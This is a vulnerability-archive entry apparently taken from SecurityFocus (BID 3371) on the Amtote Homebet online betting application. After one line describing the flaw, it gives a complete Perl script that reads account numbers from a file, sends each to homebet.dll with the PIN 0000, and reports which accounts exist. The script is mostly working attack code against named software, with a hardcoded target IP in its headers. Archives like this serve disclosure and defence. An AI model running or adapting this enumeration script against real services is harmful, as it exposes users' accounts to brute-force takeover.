source: http://www.securityfocus.com/bid/3371/info

Homebet is an internet based betting application that is developed by Amtote International.

A vulnerability exists in Homebet which could enable a non-registered user to confirm the validity of possible legitimate users and their PIN numbers. 

## Amtote brute force thingy
@method =
'POST /homebet/homebet.dll HTTP/1.1
Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-powerpoint,
application/vnd.ms-excel, application/msword, application/x-comet, */*
Referer: http://217.23.170.15/homebet/homebet.dll?form=menu&option=menu-signin
Accept-Language: en-gb
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; fs_pb_ie5)
Host: 217.23.170.15
Content-Length: 29
Connection: Keep-Alive
Cache-Control: no-cache'."\n";
$found ="notyet";

use Socket;
$prompt = "cmd\/c";
if (@ARGV<1) {die "Account cracker\n Usage \= IP/host:Port e.g. Perl $0 www.target.com\n";}

($host,$port)=split(/:/,@ARGV[0]);$target = inet_aton($host);

$account ="accounts.txt"; # file containing account numbers
unless($port){$port = 80;}

open(EXPF,$account) or die "can't open account file file $account\n";

while(<EXPF>){
$found ="notyet";

$a = $_;
chomp $a;
print "Cracking Account number\n";
print "$a\n";
#if ($a eq ""){goto hello;};

@guess = "@method" . 'form=open&account=' . $a .'&pin=0000';

@retrn = sendraw("@guess \r\n\r\n");
print @guess;
print @retrn;
foreach $line (@retrn){
	if ($line =~ "ACCOUNT NUMBER IS NOT DEFINED") { $found="no" ;  }       
		      }

if ($found eq "notyet"){goto hello}

}

hello:


if($found eq "notyet"){
print <<"endc"; 

found valid account number $a
endc
}

################### sendraw sub

sub sendraw {   # this saves the whole transaction anyway
	my ($pstr)=@_;
	socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp')||0) ||
		die("Socket problems\n");
	if(connect(S,pack "SnA4x8",2,$port,$target)){
		my @in;
		select(S);      $|=1;   print $pstr;
		while(<S>){ push @in, $_;}
		select(STDOUT); close(S); return @in;
	} else { die("Can't connect...\n"); }
}


